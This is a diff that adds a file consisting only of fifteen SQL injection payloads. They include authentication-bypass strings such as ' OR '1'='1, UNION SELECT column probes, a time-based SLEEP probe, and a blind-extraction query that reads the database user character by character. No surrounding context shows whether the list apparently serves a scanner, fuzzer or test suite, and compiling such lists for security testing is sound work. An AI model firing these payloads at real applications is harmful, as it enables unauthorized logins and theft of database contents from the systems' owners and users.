@@ -1,0 +1,15 @@
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+admin' OR '1'='1
+' OR ''='
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+') OR ('1'='1
+' OR username='admin
+' UNION SELECT 1,2,3--
+' UNION SELECT NULL,NULL,NULL--
+' OR IF(1=1,SLEEP(5),0)--
+' OR (SELECT COUNT(*) FROM users) > 0--
+' OR ASCII(SUBSTRING((SELECT USER()),1,1)) > 0--
